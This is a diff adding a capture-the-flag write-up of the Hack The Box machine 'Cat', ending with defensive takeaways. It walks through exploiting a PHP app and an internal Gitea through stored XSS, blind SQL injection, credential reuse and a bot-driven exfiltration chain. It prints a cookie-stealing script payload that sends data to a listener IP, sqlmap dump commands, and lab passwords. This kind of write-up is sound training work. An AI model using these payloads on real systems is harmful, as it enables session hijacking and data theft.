@@ -1,0 +1,167 @@
+Title: Cat
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Cat was a Linux box built around a "cat photo contest" PHP web app backed by SQLite, plus an internally-bound Gitea instance. An unsanitized username field in the login form allows stored XSS, which is used to hijack a live admin session cookie and unlock the admin panel. A separate blind SQL injection in the cat-approval endpoint then dumps the app's user table, and a cracked password hash grants SSH access. From there, a locally-bound Gitea instance is reached via port forwarding, plaintext credentials are recovered from an Apache access log, and internal email reveals a bot account (`jobert`) that reviews Gitea repositories. A second XSS payload delivered through a repository description is used to make that bot fetch and exfiltrate a private repo's PHP source, leaking hardcoded admin credentials that are reused directly as the root password.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.53
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+> nmap -sC -sV -p22,80 10.10.11.53
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Did not follow redirect to http://cat.htb/
+```
+
+## Web Enumeration
+
+```
+> nikto -h http://cat.htb
++ /config.php: PHP Config file may contain database IDs and passwords.
++ /.git/index: Git Index file may contain directory listing information.
++ /.git/HEAD: Git HEAD file found. Full repo details may be present.
++ /.git/config: Git config file found. Infos about repo details may be present.
+
+> feroxbuster -u http://cat.htb
+302  http://cat.htb/contest.php => http://cat.htb/join.php
+301  http://cat.htb/uploads => http://cat.htb/uploads/
+200  http://cat.htb/
+301  http://cat.htb/winners => http://cat.htb/winners/
+```
+
+An exposed `.git` directory was pulled down with `git-dumper`, recovering the app's PHP source. That source showed an admin account named `axel` referenced in `admin.php`, and `config.php` pointed at a SQLite database at `/databases/cat.db` (not directly web-accessible). The login form (`join.php`) turned out to authenticate via a GET request, but fuzzing the password parameter against rockyou.txt found nothing useful.
+
+## Foothold Part 1 - Stored XSS Session Hijack
+
+The `join.php` login form does not sanitize the submitted username, so a username value can contain HTML/JS that executes wherever it's later rendered. A username was registered as a `<script>` tag that `fetch()`es a listener with `document.cookie`:
+
+```
+Register username: <script>fetch('http://10.10.14.179:7575/log?c='+document.cookie)</script>
+```
+
+Logging in as that user and submitting a cat entry in the contest page triggered the payload from an authenticated (higher-privileged) context, leaking a valid `PHPSESSID` back to the listener. Swapping that session cookie in via the browser's storage inspector unlocked `http://cat.htb/admin.php`, which had previously been inaccessible.
+
+## Foothold Part 2 - Blind SQL Injection
+
+Recovered source for `accept_cat.php` showed the `catName` parameter was passed unsanitized into a SQLite query used when an admin approves a submitted cat. A Burp-captured request for that endpoint was saved to a file, the `catName` value marked as the injection point, and fed to sqlmap:
+
+```
+> sqlmap -r post.txt --dbms=SQLite --os-shell --level=5 --risk=3
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Type: time-based blind
+```
+
+SQLite doesn't support OS command execution through sqlmap, so the attack was limited to data extraction rather than a shell:
+
+```
+> sqlmap -r post.txt --dbms=SQLite --level=5 --risk=3 -D main --tables --threads 10
+accepted_cats | cats | sqlite_sequence | users
+
+> sqlmap -r post.txt --dbms=SQLite --level=5 --risk=3 -D main -T users --dump --threads 10
+```
+
+This dumped the full `users` table, including emails, usernames, and password hashes for `axel`, `rosa`, `robert`, `fabian`, `jerryson`, `larry`, `royer`, `peter`, `angel`, and `jobert`. Running the hashes through hashcat cracked one:
+
+```
+> hashcat -a 0 -m 0 hash.txt rockyou.txt
+rosa:soyunaprincesarosa
+```
+
+## Lateral Movement - SSH as rosa
+
+```
+> ssh rosa@10.10.11.53
+```
+
+The cracked credentials worked over SSH. No flag was present in `rosa`'s home directory, but `/home` also listed `axel`, `git`, and `jobert` accounts. linpeas flagged a few unusual SGID/SUID binaries (`mailstats`, `sensible-mda`, `sendmail`) and a pkexec policy noted as vulnerable to CVE-2021-3560, but none of those led anywhere further.
+
+## Internal Service Discovery
+
+Enumerating listening loopback ports and forwarding each one over SSH eventually identified an internal Gitea instance:
+
+```
+tcp 127.0.0.1:37987
+tcp 127.0.0.1:41385
+tcp 127.0.0.1:587
+tcp 127.0.0.1:36019
+tcp 127.0.0.1:3000
+tcp 127.0.0.1:25
+
+> ssh -N -L 1234:localhost:3000 rosa@10.10.11.53
+> nmap -sC -sV -p1234 localhost
+1234/tcp open  http    Golang net/http server
+|_http-title: Cat
+```
+
+Port 3000 is Gitea 1.22.0. Ports 25/587 turned out to be a local Sendmail instance (used later to email the `jobert` bot account); the remaining ports (37987, 41385, 36019) didn't yield anything of use.
+
+## Credential Leak via Apache Access Log
+
+Searching `/var` for API keys didn't find a Gitea token directly, but turned up the Apache access log, which had captured a prior plaintext login request for the admin account:
+
+```
+> cat /var/log/apache2/access.log
+GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login
+```
+
+```
+axel:aNdZwgC4tI9gnVXv_e3Q
+```
+
+## Lateral Movement - SSH as axel
+
+```
+> ssh axel@10.10.11.53
+```
+
+This gave the user flag and a login notice of "You have mail." Checking local mail revealed two messages from `rosa@cat.htb`:
+
+- The first asked `axel` to email `jobert@localhost` with details of a Gitea repository so `jobert` could review it, stressing that the description should clearly explain the idea since the whole repository would be reviewed.
+- The second described an in-development "Employee Management" system hosted in a private Gitea repo at `http://localhost:3000/administrator/Employee-management/`, along with a README at the `/raw/branch/main/README.md` path.
+
+## Second XSS Chain - Exfiltrating Private Repo Source via the jobert Bot
+
+Gitea 1.22.0 was checked against a public advisory (exploit-db 52077) describing an XSS issue; a direct cookie-theft attempt against an admin session failed because the CSRF cookie is `HttpOnly`. Instead, the plan shifted to using `jobert`'s repo-review behavior as an XSS delivery mechanism:
+
+- A new Gitea repo (`test`) was created under `axel`'s account with a description containing a JavaScript-executing link (`<a href="javascript:...">`) that would fetch a URL and exfiltrate the response to a listener.
+- Sendmail (found running locally on the box) was used to email `jobert@localhost`, pointing at the new repository so the bot would visit it.
+- Early attempts asking the bot to download and run a shell script were ignored - the bot only ever seems to click links, not execute arbitrary instructions in the email body.
+- Simply having the payload in the repository description wasn't enough for the bot to trigger it either; the payload also needed to appear in the repo's own README for the bot to interact with it as part of its review.
+- Once a payload link was present in both the repo description and README, clicking it as the bot fetched and returned the private Employee Management repo's README content, confirming the exfiltration channel worked.
+
+Because the private repo's full page content and later its raw PHP source were long, the exfiltration channel was switched from a GET request with URL-encoded data to a POST request captured with a raw netcat listener writing to a file. Iterating over the leaked file listing (converting `/src/` paths to `/raw/`) eventually targeted `index.php` for the Employee Management repo, and the exfiltrated source contained hardcoded HTTP Basic Auth credentials:
+
+```php
+$valid_username = 'admin';
+$valid_password = 'IKw75eR0MR7CMIxhH0';
+```
+
+```
+admin:IKw75eR0MR7CMIxhH0
+```
+
+## Privilege Escalation - Reused Admin Password
+
+From an SSH session as `axel`, the leaked password was tried directly as a local privilege-escalation credential:
+
+```
+axel> su -
+```
+
+The password was accepted, giving a root shell.
+
+## Takeaways
+
+- Any field that gets rendered back into a page (like a "username") needs output encoding, not just input validation - an unsanitized username here was enough for full stored XSS.
+- Session cookies without `HttpOnly` can be stolen with a simple `fetch()`-based XSS payload; setting `HttpOnly` (as this app's CSRF cookie had) blocks that specific vector but doesn't stop other exfiltration paths.
+- SQLite-backed apps are still fully vulnerable to blind SQL injection for data extraction, even though sqlmap can't get OS command execution out of SQLite specifically.
+- Automated bot/reviewer accounts (like `jobert` here) that visit links contained in submitted content are a real attack surface - especially when they'll browse to internal-only resources (like a private Gitea repo) that the attacker couldn't otherwise reach.
+- Hardcoded credentials in application source code have a way of being reused elsewhere (here, directly as a Unix account password) - leaking source is often equivalent to leaking credentials.
